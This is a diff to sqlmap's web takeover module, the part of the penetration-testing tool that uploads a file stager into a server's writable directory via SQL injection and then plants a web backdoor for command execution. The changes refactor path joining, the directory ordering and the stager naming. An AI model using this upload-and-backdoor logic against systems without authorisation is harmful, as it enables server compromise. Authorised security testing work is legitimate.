@@ -1,14 +1,15 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2014 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2015 sqlmap developers (http://sqlmap.org/)
 See the file 'doc/COPYING' for copying permission
 """
 
-import urlparse
 import os
+import posixpath
 import re
 import StringIO
+import urlparse
 
 from tempfile import mkstemp
 
@@ -46,6 +47,7 @@ from lib.core.settings import BACKDOOR_RUN_CMD_TIMEOUT
 from lib.core.settings import EVENTVALIDATION_REGEX
 from lib.core.settings import VIEWSTATE_REGEX
 from lib.request.connect import Connect as Request
+from thirdparty.oset.pyoset import oset
 
 
 class Web:
@@ -129,7 +131,7 @@ class Web:
             return False
 
     def _webFileInject(self, fileContent, fileName, directory):
-        outFile = ntToPosixSlashes(os.path.join(directory, fileName))
+        outFile = posixpath.join(ntToPosixSlashes(directory), fileName)
         uplQuery = getUnicode(fileContent).replace("WRITABLE_DIR", directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory)
         query = ""
 
@@ -197,20 +199,20 @@ class Web:
 
         directories = list(arrayizeValue(getManualDirectories()))
         directories.extend(getAutoDirectories())
-        directories = sorted(set(directories))
+        directories = list(oset(directories))
 
         backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webApi)
         backdoorContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoor.%s_" % self.webApi))
 
-        stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
         stagerContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stager.%s_" % self.webApi))
         success = False
 
         for directory in directories:
-            self.webStagerFilePath = ntToPosixSlashes(os.path.join(directory, stagerName))
+            if not directory:
+                continue
 
-            if success:
-                break
+            stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
+            self.webStagerFilePath = posixpath.join(ntToPosixSlashes(directory), stagerName)
 
             uploaded = False
             directory = ntToPosixSlashes(normalizePath(directory))
@@ -220,9 +222,12 @@ class Web:
             else:
                 directory = directory[2:] if isWindowsDriveLetterPath(directory) else directory
 
-            # Upload the file stager with the LIMIT 0, 1 INTO DUMPFILE technique
+            if not directory.endswith('/'):
+                directory += '/'
+
+            # Upload the file stager with the LIMIT 0, 1 INTO DUMPFILE method
             infoMsg = "trying to upload the file stager on '%s' " % directory
-            infoMsg += "via LIMIT 'LINES TERMINATED BY' technique"
+            infoMsg += "via LIMIT 'LINES TERMINATED BY' method"
             logger.info(infoMsg)
             self._webFileInject(stagerContent, stagerName, directory)
 
@@ -239,7 +244,7 @@ class Web:
                     uploaded = True
                     break
 
-            # Fall-back to UNION queries file upload technique
+            # Fall-back to UNION queries file upload method
             if not uploaded:
                 warnMsg = "unable to upload the file stager "
                 warnMsg += "on '%s'" % directory
@@ -247,8 +252,11 @@ class Web:
 
                 if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
                     infoMsg = "trying to upload the file stager on '%s' " % directory
-                    infoMsg += "via UNION technique"
+                    infoMsg += "via UNION method"
                     logger.info(infoMsg)
+
+                    stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
+                    self.webStagerFilePath = posixpath.join(ntToPosixSlashes(directory), stagerName)
 
                     handle, filename = mkstemp()
                     os.fdopen(handle).close()  # close low level handle (causing problems later)
@@ -274,19 +282,8 @@ class Web:
                             uploaded = True
                             break
 
-            # Extra check - required
             if not uploaded:
-                self.webBaseUrl = "%s://%s:%d/" % (conf.scheme, conf.hostname, conf.port)
-                self.webStagerUrl = urlparse.urljoin(self.webBaseUrl, stagerName)
-
-                debugMsg = "trying to see if the file is accessible from '%s'" % self.webStagerUrl
-                logger.debug(debugMsg)
-
-                uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
-                uplPage = uplPage or ""
-
-                if "sqlmap file uploader" not in uplPage:
-                    continue
+                continue
 
             if "<%" in uplPage or "<?" in uplPage:
                 warnMsg = "file stager uploaded on '%s', " % directory
@@ -339,10 +336,10 @@ class Web:
                     else:
                         continue
 
-                self.webBackdoorUrl = ntToPosixSlashes(os.path.join(self.webBaseUrl, backdoorName))
+                self.webBackdoorUrl = posixpath.join(ntToPosixSlashes(self.webBaseUrl), backdoorName)
                 self.webDirectory = directory
 
-            self.webBackdoorFilePath = ntToPosixSlashes(os.path.join(directory, backdoorName))
+            self.webBackdoorFilePath = posixpath.join(ntToPosixSlashes(directory), backdoorName)
 
             testStr = "command execution test"
             output = self.webBackdoorRunCmd("echo %s" % testStr)
